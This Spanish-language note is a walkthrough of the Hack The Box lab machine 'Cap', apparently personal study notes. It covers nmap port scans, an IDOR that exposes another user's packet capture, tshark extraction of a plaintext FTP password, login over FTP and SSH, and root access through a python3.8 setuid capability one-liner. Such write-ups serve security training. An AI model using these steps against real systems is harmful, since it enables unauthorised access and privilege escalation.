---
tags:
  - HTB
  - eJPT
  - easy
  - Linux
  - vsftpd
  - OpenSSH
  - http
aliases:
  - Insecure Directory Object Reference (IDOR)
  - Information Leakage
  - Abusing Capabilities (python3.8) (Privilege Escalation)
  - vsftpd 3.0.3
  - OpenSSH 8.2P1 Ubuntu 4Ubuntu0.2
  - http gunicorn
---

| ![[Pasted image 20250325214342.png\|300]] | - OS — Linux<br>- Difficulty — Easy<br>- Released — June 5, 2021<br>- Creator — InfoSecJack |
| ----------------------------------------- | ------------------------------------------------------------------------------------------- |
# Introducción

Cap es una máquina Linux de dificultad fácil que ejecuta un servidor HTTP, lo que permite a los usuarios capturar el tráfico no cifrado. Un control inadecuado da como resultado una Referencia Directa a Objetos Insegura (IDOR), que permite el acceso a la captura de otro usuario. La captura contiene credenciales en texto plano y puede utilizarse para obtener acceso. Posteriormente, se utiliza una función de Linux para obtener acceso root.

### Skills

[[Insecure Directory Reference (IDOR)]]
[[Information Leakage]]
[[Abusing Capabilities (python3.8) (Privilege Escalation)]]]

# Enumeración

```Linux

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP MAQUINA> -oG allPorts

```

```Linux

nmap -sCV -p21,22,80 <IP MAQUINA> -oN targeted

```
### Puertos

21 ----> vsftpd 3.0.3
22 ----> OpenSSH 8.2P1 Ubuntu 4Ubuntu0.2
80 ----> http gunicorn


# WEB

## Information Leakage

La página web revela información al consultarla a través de la URL.

![[Pasted image 20250325232931.png]]

### IDOR


Un aspecto interesante a tener en cuenta es el esquema de URL al crear una nueva captura, que tiene el formato /data/id. El ID se incrementa con cada captura. Es posible que haya habido capturas de paquetes de usuarios anteriores. Al navegar a /data/0, se revela una captura de paquetes con varios paquetes.


![[Pasted image 20250325225924.png]]

```Linux

tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r

```

```Linux

PASS Buck3tH4TF0RM3!

```

# Acceso

### FTP

```Linux

ftp@<IP MAQUINA>
username: nathan
password: Buck3tH4TF0RM3!

```

```ftp

get user.txt

```


### SSH


```Linux

ssh nathan@<IP MAQUINA>

password: Buck3tH4TF0RM3!

```

## Escalada

```Linux

getcap -r / 2>/dev/null

```

Este comando **intenta obtener una shell como root**, pero **solo funcionará si el proceso de Python se está ejecutando con privilegios de root**, o si el ejecutable de Python tiene el bit `setuid` activado
```Linux

python3.8 -c 'import os; os.setuid(0); os.system("bash")'

```
intenta ejecutar un **shell bash como el usuario root** (UID 0) usando Python 3.8.
- `python3.8 -c '...'`: ejecuta el código Python que está dentro de las comillas directamente desde la línea de comandos.
    
- `import os`: importa el módulo `os`, que permite interactuar con el sistema operativo.
    
- `os.setuid(0)`: cambia el ID de usuario del proceso actual a `0`, que es el UID del usuario **root**.
    
- `os.system("bash")`: ejecuta el comando `bash`, abriendo una shell.

```Linux

cd /rot/
cat root.txt

```
